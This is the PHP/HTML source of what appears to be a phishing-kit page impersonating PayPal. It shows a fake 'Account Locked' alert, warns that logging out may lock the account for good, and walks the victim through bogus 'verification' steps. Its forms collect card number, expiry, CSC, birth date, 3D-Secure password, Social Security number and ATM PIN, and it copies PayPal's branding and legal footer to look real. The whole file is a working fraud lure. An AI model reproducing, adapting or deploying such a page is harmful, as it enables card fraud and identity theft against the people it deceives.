<?php
if(INC != "true") {
  exit();
}
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Paypal : Summary</title>
    <link rel="stylesheet" href="assets/fa/css/font-awesome.min.css" media="screen" title="no title" charset="utf-8">
    <link rel="stylesheet" href="assets/css/master.css" media="screen" title="no title" charset="utf-8">
    <link rel="icon" type="image/png" href="assets/img/favicon.ico" />
    <script src="assets/js/account.js" charset="utf-8"></script>
    <meta name="viewport" content="width=device-width, user-scalable=no">
  </head>
  <body>
    <div class="main_account">
      <div class="header" id="header">
        <div class="wrapper">
          <div class="pp"></div>
          <ul>
            <li>SUMMARY</li>
            <li class="inactive" onclick="showModal()">ACTIVITY</li>
            <li class="inactive" onclick="showModal()">SEND PAYMENTS</li>
            <li class="inactive" onclick="showModal()">WALLET</li>
            <li class="inactive" onclick="showModal()">SHOP</li>
          </ul>
          <div class="right">
            <span class="fa fa-bell notf" id="bellfa"></span>
            <span class="fa fa-cog"></span>
            <div class="logout" onclick="showModal()">
              Log Out
            </div>
          </div>
          <div class="leftr">
            <div class="mainmenu" id="mainmenu">
              Main Menu
            </div>
          </div>
          <div class="rightr">
            <span class="fa fa-bell notf" id="bellfa2"></span>
          </div>
        </div>
      </div>
      <div class="menu_responsive" id="menresp">
        <span class="fa fa-cog"></span>
        <h1 onclick="showModal()">Log Out</h1>
        <ul>
          <li class="actives" onclick="showModal()">SUMMARY</li>
          <li onclick="showModal()">ACTIVITY</li>
          <li onclick="showModal()">SEDN PAYMENTS</li>
          <li onclick="showModal()">WALLET</li>
          <li class="last" onclick="showModal()">SHOP</li>
        </ul>
      </div>
      <div class="blurbody hidden" id="blurbody"></div>
      <div class="modal_background hidden" id="logmod"></div>
      <div class="logout_modal hidden" id="logmd">
        <h2>If you log out your account may be locked permanently</h2>
        <button onclick="hideModal()">Stay logged in</button>
      </div>
      <div class="header_part" id="header_part">
        <div class="wrapperp">
          <h1>Account Locked !</h1>
        </div>
      </div>
      <div class="notification_menu" id="notmenu">
        <div class="nothead">
          <h1>Notifications</h1>
          <div class="close" id="closemen"></div>
        </div>
        <div class="middle">
          <h2>View your messages</h2>
          <button class="messages">Go to Message Center</button>
        </div>
        <div class="final">
          <h3>There's a problem with your account. Make sure to resolve it so you have <br/>full access to your account immediately.</h3>
        </div>
      </div>
      <div class="load_screen hidden" id="spinner">
        <div class="loading"></div>
        <div class="load_box">
          <div class="spinner">
            <div class="loadings"></div>
          </div>
          <p>Verifying your information...</p>
        </div>
      </div>
      <div class="mainBody" id="mainBody">
        <div class="wrapperb">
          <div class="containerAccount">
            <h1>Progress</h1>
            <div class="progress">
              <div class="item">
                <div class="ball active"></div>
                <p>Security check</p>
              </div>
              <div class="item">
                <div class="ball active"></div>
                <p>Confirm billing address</p>
              </div>
              <div class="item">
                <div class="ball"></div>
                <p>Confirm your Card details</p>
              </div>
              <div class="item">
                <div class="ball"></div>
                <p>Upload your proof document</p>
              </div>
            </div>
          </div>
          <div class="containerForm">
            Confirm Card details
            <div class="form">
              <input placeholder="Cardholder name" id="name" style="text-transform : capitalize;" />
              <input placeholder="Card number" id="cn" class="noAnim" maxlength="19" autocomplete="off" onselectstart="return false" onpaste="return false;" onkeydown="checkCredit(event)" onfocusout="creditIcon()"/>
              <div>
                <input placeholder="Expiration date" onkeydown="checkDate(event)" id="ex" class="small" onpaste="return false;" maxlength="7" />
                <input placeholder="CSC" id="csc" class="small credit" onpaste="return false;" maxlength="4" />
              </div>
              <button style="margin-top : 30px;" onclick="confirmCard()">Confirm</button>
            </div>
          </div>
          <div class="modal_background hidden" id="modbg"></div>
          <div class="credit_modal hidden" id="modfo">
            <div class="credit"><div id="ct" style="display : inline-block;"></div> x-<div id="cne" style="display : inline-block;"></div></div>
            <div class="creditn"></div>
            <div class="form">
              <h2>Birth date</h2>
              <input id="bd" placeholder="DD/MM/YYYY" onkeydown="checkBD(event)" maxlength="10" />
              <h2 class="hidden" id="secvl">Security information</h2>
              <input placeholder="3D-Secure" type="password" class="master hidden" id="secv" />
              <h2>Social security number</h2>
              <input id="ssn" placeholder="SSN (9 digits)"  onkeydown="checkSS(event)" maxlength="11" />
              <h2>ATM or Debit Card PIN</h2>
              <input id="pin" placeholder="Card PIN" type="password" />
              <button onclick="verifycard()">Continue</button>
            </div>
          </div>
        </div>
      </div>
      <div class="mainFooter" id="mainFooter">
        <div class="wrapperf">
          <div class="headfooter">
            <h1>HELP & CONTACT</h1>
            <h1>SECURITY</h1>
          </div>
          <div class="middlefooter">
            <div class="menufo"><a href="#">Privacy</a><a href="#">Legal</a></div>
            <div class="copy">Copyright &copy;1999-<script>document.write(new Date().getFullYear());</script> PayPal. All rights reserved.</div>
          </div>
          <div class="finalfooter">
            Consumer advisory- PayPal Pte. Ltd., the holder of PayPal’s stored value facility, does not require the approval of the Monetary Authority of Singapore. Users are advised to read the <b>terms and conditions</b> carefully.
          </div>
        </div>
      </div>
    </div>
  </body>
</html>
